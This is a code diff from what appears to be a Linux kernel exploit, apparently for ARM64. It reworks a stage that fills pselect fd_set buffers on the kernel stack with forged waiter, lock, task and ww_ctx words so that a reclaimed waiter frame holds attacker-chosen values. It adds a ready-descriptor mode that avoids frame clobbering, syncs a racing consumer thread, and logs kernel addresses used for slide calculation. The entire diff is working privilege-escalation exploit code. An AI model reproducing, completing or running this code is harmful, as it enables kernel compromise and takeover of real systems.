@@ -5,7 +5,7 @@
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_WAIT_SECONDS 30
 #define SLIDE_SHIFT_MIN 0
-#define SLIDE_SHIFT_MAX 8
+#define SLIDE_SHIFT_MAX 16
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -64,6 +64,10 @@ void slide_pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, int shift, uint64_t value, const char *name) {
   int global_word = shift + waiter_word;
+  int input_words = 3 * words_per_set;
+  if (global_word >= input_words && global_word < 2 * input_words) {
+    global_word -= input_words;
+  }
   int placed = slide_pselect_put_global_word(
       in, out, ex, words_per_set, global_word, value);
   if (!placed) {
@@ -100,6 +104,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {10, shift, SLIDE_INIT_TASK, "task"},
     {11, shift, fake_lock, "lock"},
     {12, shift, 3, "wake_state"},
+    {13, shift, 0, "ww_ctx"},
   };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
@@ -133,37 +138,58 @@ void slide_pselect_stack_copy(void) {
     return;
   }
 
-  int pipefd[2] = {-1, -1};
-  SYSCHK(pipe(pipefd));
-  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-  if (block_fd < 0) {
-    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
-               errno);
-    block_fd = pipefd[0];
-  }
-  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
-  if (high_read < 0) {
-    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    return;
-  }
-
   fd_set in;
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
+  fd_set expected_in = in;
+  fd_set expected_out = out;
+  fd_set expected_ex = ex;
+  int use_results = pselect_stack_uses_result_sets(slide_runtime_shift, 13);
+  int pipefd[2] = {-1, -1};
+  int block_fd = -1;
+  int high_read = -1;
+  int ready_fd = -1;
+  int peer_fd = -1;
+
+  if (use_results) {
+    if (!open_ready_selected_fds(
+            &in, &out, &ex, &ready_fd, &peer_fd)) {
+      pr_error("slide pselect ready-fd setup failed errno=%d\n", errno);
+      return;
+    }
+  } else {
+    SYSCHK(pipe(pipefd));
+    block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+    if (block_fd < 0) {
+      pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
+                 errno);
+      block_fd = pipefd[0];
+    }
+    high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
+    if (high_read < 0) {
+      pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
+      close(pipefd[0]);
+      close(pipefd[1]);
+      return;
+    }
+  }
+
   pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
-          "fake_w0=%016zx fake_task=%016zx loggers=%016zx bootid=%016zx\n",
+          "fake_w0=%016zx fake_task=%016zx loggers=%016zx bootid=%016zx "
+          "result_mode=%d\n",
           slide_runtime_shift, page_base, fake_lock, fake_w0, fake_task,
-          (uintptr_t)SLIDE_LOGGERS_0_1, (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA);
+          (uintptr_t)SLIDE_LOGGERS_0_1, (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA,
+          use_results);
   slide_flush_logs();
   pr_info("slide pselect before fd install nfds=%d\n", SLIDE_PSELECT_NFDS);
   slide_flush_logs();
-  open_slide_selected_fds(&in, &out, &ex, high_read);
+  if (!use_results) {
+    open_slide_selected_fds(&in, &out, &ex, high_read);
+  }
   pr_info("slide pselect after fd install\n");
   slide_flush_logs();
 
@@ -178,33 +204,63 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_last_sched_errno, 0);
 
   struct timespec timeout = {
-    .tv_sec = PSELECT_TIMEOUT_SEC,
+    .tv_sec = use_results ? 0 : PSELECT_TIMEOUT_SEC,
     .tv_nsec = 0,
   };
-  struct timespec *timeoutp = &timeout;
+  /*
+   * Ready descriptors make result mode return immediately without a timeout.
+   * A non-NULL timeout makes the syscall wrapper call deeper time-copy helpers
+   * after core_sys_select returns, clobbering the reclaimed waiter frame.
+   */
+  struct timespec *timeoutp = use_results ? NULL : &timeout;
 
-  atomic_store(&slide_consume_go, 1);
+  if (!use_results) {
+    atomic_store(&slide_consume_go, 1);
+  }
   pr_info("slide pselect before syscall\n");
   slide_flush_logs();
   errno = 0;
 
-  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
+  int ret = (int)syscall(
+      SYS_pselect6, SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  int sets_match = !use_results || pselect_fdsets_match(
+      &expected_in, &expected_out, &expected_ex, &in, &out, &ex);
+  if (use_results && ret >= 0 && sets_match) {
+    atomic_store(&slide_consume_go, 1);
+    while (!atomic_load(&slide_consume_stop)) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+  }
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
+  pr_info("slide pselect returned ret=%d errno=%d result_mode=%d "
+          "sets_match=%d calls=%d sched_ok=%d last_sched_ret=%d "
+          "last_sched_errno=%d\n",
+          ret, saved_errno, use_results, sets_match,
+          atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
   slide_flush_logs();
 
-  close(high_read);
-  if (block_fd != pipefd[0]) {
+  if (high_read >= 0) {
+    close(high_read);
+  }
+  if (block_fd >= 0 && block_fd != pipefd[0]) {
     close(block_fd);
   }
-  close(pipefd[0]);
-  close(pipefd[1]);
+  if (pipefd[0] >= 0) {
+    close(pipefd[0]);
+  }
+  if (pipefd[1] >= 0) {
+    close(pipefd[1]);
+  }
+  if (ready_fd >= 0) {
+    close(ready_fd);
+  }
+  if (peer_fd >= 0) {
+    close(peer_fd);
+  }
 }
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
@@ -238,7 +294,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       continue;
     }
 
-    if (seq == 1) {
+    if (seq == 1 &&
+        !pselect_stack_uses_result_sets(slide_runtime_shift, 13)) {
       usleep(PSELECT_ENTER_DELAY_USEC);
     }
 
